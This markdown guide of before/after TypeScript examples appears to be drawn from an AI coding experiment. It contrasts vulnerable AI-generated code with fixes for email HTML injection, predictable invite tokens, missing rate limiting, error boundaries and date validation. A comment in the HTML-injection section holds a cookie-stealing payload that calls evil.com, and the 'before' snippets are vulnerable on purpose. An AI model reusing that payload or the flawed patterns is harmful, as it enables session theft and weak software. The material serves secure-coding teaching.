# Before/After Code Examples — Security

> Source: Condition A (baseline, no guidelines) run-1 actual AI output
> Purpose: Add to security.md guidelines to improve AI compliance on frequently missed items

---

## S8: Email HTML Injection Prevention

**Without guidelines** — AI interpolates user-controlled values directly into HTML templates:

```typescript
// ❌ Before: AI-generated (condition-a/run-1/src/lib/email.ts)
export async function sendTeamInvitationEmail(
  email: string,
  teamName: string,      // ← user-created team name
  inviterName: string,
  inviteUrl: string,
) {
  await transporter.sendMail({
    to: email,
    subject: `You've been invited to join ${teamName} on TaskFlow`,
    html: `
      <p><strong>${inviterName}</strong> has invited you to join
      the team <strong>${teamName}</strong> on TaskFlow.</p>
      <a href="${inviteUrl}">Accept Invitation</a>
    `,
    //  💀 teamName = '<img src=x onerror="fetch(`https://evil.com?c=`+document.cookie)">'
    //     → HTML injection via team name
  });
}
```

**With guidelines** — Escape all user-originated values before embedding in HTML:

```typescript
// ✅ After: HTML-escaped before insertion
function escapeHtml(str: string): string {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

export async function sendTeamInvitationEmail(
  email: string,
  teamName: string,
  inviterName: string,
  inviteUrl: string,
) {
  // ✅ Escape user-originated values (team name is set by users)
  const safeTeamName = escapeHtml(teamName);
  const safeInviterName = escapeHtml(inviterName);
  const safeUrl = encodeURI(inviteUrl);

  await transporter.sendMail({
    to: email,
    subject: `You've been invited to join ${safeTeamName} on TaskFlow`,
    html: `
      <p><strong>${safeInviterName}</strong> has invited you to join
      the team <strong>${safeTeamName}</strong> on TaskFlow.</p>
      <a href="${safeUrl}">Accept Invitation</a>
    `,
  });
}
```

---

## S9: Cryptographically Secure Invitation Tokens

**Without guidelines** — AI uses Prisma's `cuid()` default, which is NOT cryptographically secure:

```typescript
// ❌ Before: AI-generated (condition-a/run-1/prisma/schema.prisma)
model TeamInvitation {
  id          String    @id @default(cuid())
  email       String
  teamId      String
  token       String    @unique @default(cuid())  // 💀 cuid() is predictable
  expiresAt   DateTime
  // ...
}
```

**With guidelines** — Generate tokens with `crypto.randomBytes`:

```typescript
// ✅ After: Cryptographically secure token generated in application code
import crypto from "crypto";

// In prisma/schema.prisma: token String @unique (no @default)
// Token generated in server action:
const token = crypto.randomBytes(32).toString("hex");

await prisma.teamInvitation.create({
  data: {
    email,
    teamId,
    token,  // ✅ 256-bit cryptographic random value
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
    invitedById: session.user.id,
  },
});
```

---

## S11: Rate Limiting on Authentication Endpoints

**Without guidelines** — AI implements no rate limiting on auth Server Actions (failed in ALL 3 conditions):

```typescript
// ❌ Before: AI-generated (condition-a/run-1/src/lib/actions/auth.ts)
"use server";

export async function registerUser(formData: FormData): Promise<ActionResult> {
  // No rate limiting — attacker can try unlimited registrations
  const parsed = RegisterSchema.safeParse(/* ... */);
  // ...
}

export async function requestPasswordReset(formData: FormData): Promise<ActionResult> {
  // No rate limiting — attacker can enumerate emails or flood reset requests
  const parsed = ForgotPasswordSchema.safeParse(/* ... */);
  // ...
}
```

**With guidelines** — Apply rate limiting per IP on all auth endpoints:

```typescript
// ✅ After: Rate limiting applied to auth Server Actions
"use server";

import { headers } from "next/headers";
import { checkRateLimit } from "@/lib/rate-limit";

export async function registerUser(formData: FormData): Promise<ActionResult> {
  // ✅ 5 attempts per minute per IP
  const ip = (await headers()).get("x-forwarded-for") ?? "unknown";
  const { success } = await checkRateLimit(`auth:register:${ip}`, {
    maxRequests: 5,
    windowMs: 60_000,
  });
  if (!success) {
    return { success: false, error: "Too many attempts. Please try again later." };
  }

  const parsed = RegisterSchema.safeParse(/* ... */);
  // ...
}
```

```typescript
// ✅ lib/rate-limit.ts — Simple in-memory rate limiter
const store = new Map<string, { count: number; resetAt: number }>();

export async function checkRateLimit(
  key: string,
  opts: { maxRequests: number; windowMs: number },
): Promise<{ success: boolean; remaining: number }> {
  const now = Date.now();
  const entry = store.get(key);

  if (!entry || now > entry.resetAt) {
    store.set(key, { count: 1, resetAt: now + opts.windowMs });
    return { success: true, remaining: opts.maxRequests - 1 };
  }

  if (entry.count >= opts.maxRequests) {
    return { success: false, remaining: 0 };
  }

  entry.count++;
  return { success: true, remaining: opts.maxRequests - entry.count };
}
```

---

## E4: Error Boundaries per Route Segment

**Without guidelines** — AI places error.tsx only at root level or not at all:

```
// ❌ Before: Only one error boundary
app/
├── (app)/
│   ├── error.tsx       ← only here
│   ├── tasks/
│   │   └── page.tsx    ← no error boundary
│   └── teams/
│       └── [id]/
│           └── page.tsx ← no error boundary
└── (auth)/
    └── login/
        └── page.tsx     ← no error boundary
```

**With guidelines** — Each route segment has its own error boundary:

```
// ✅ After: Error boundaries at each segment
app/
├── error.tsx               ← root fallback
├── not-found.tsx           ← custom 404
├── (app)/
│   ├── error.tsx           ← protected routes fallback
│   ├── tasks/
│   │   ├── error.tsx       ← task-specific errors
│   │   └── page.tsx
│   └── teams/
│       ├── error.tsx       ← team-specific errors
│       └── [id]/
│           ├── error.tsx   ← team detail errors
│           └── page.tsx
└── (auth)/
    ├── error.tsx           ← auth-specific errors
    └── login/
        └── page.tsx
```

```tsx
// ✅ app/(app)/tasks/error.tsx
"use client";

export default function TasksError({
  error,
  reset,
}: {
  error: Error & { digest?: string };
  reset: () => void;
}) {
  console.error("[TasksError]", error);

  return (
    <div className="flex flex-col items-center justify-center gap-4 p-8">
      <h2 className="text-lg font-semibold">Failed to load tasks</h2>
      <p className="text-muted-foreground">Something went wrong. Please try again.</p>
      <button onClick={reset} className="btn btn-primary">
        Try again
      </button>
    </div>
  );
}
```

---

## V9: Date Range Validation

**Without guidelines** — AI validates date format but not range:

```typescript
// ❌ Before: Format only, no range check
const createTaskSchema = z.object({
  title: z.string().min(1).max(200),
  dueDate: z.string().datetime().optional(),  // 💀 accepts past dates like "2020-01-01"
});
```

**With guidelines** — Validate that due date is in the future:

```typescript
// ✅ After: Format + range validation
const createTaskSchema = z.object({
  title: z.string().min(1).max(200),
  dueDate: z
    .string()
    .datetime()
    .optional()
    .refine(
      (val) => !val || new Date(val) > new Date(),
      { message: "Due date must be in the future" },
    ),
});
```
